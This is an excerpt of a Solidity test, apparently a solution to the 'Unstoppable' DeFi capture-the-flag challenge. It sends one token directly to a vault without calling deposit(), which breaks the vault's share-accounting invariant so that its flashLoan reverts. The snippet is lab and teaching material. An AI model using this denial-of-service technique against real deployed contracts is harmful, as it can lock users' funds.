...
contract UnstoppableChallenge is Test {
    ...
    // Log totalAssets (balance of vault)
    uint256 assets = vault.totalAssets();
    console.log("totalAssets: ", assets);
    // Inject token directly without calling deposit()
    token.transfer(address(vault), 1);
    console.log("token made trasnfer to : vault");
    ...
    // Calculate convertToShares(totalSupply)
    uint256 converted = vault.convertToShares(supply);
    console.log("convertToShares(totalSupply): ", converted);


    // Optional: Compare values directly
    if (converted != assets) {
        console.log("Invariant broken! flashLoan would revert.");
    } else {
        console.log("Invariant holds. flashLoan is usable.");
    }
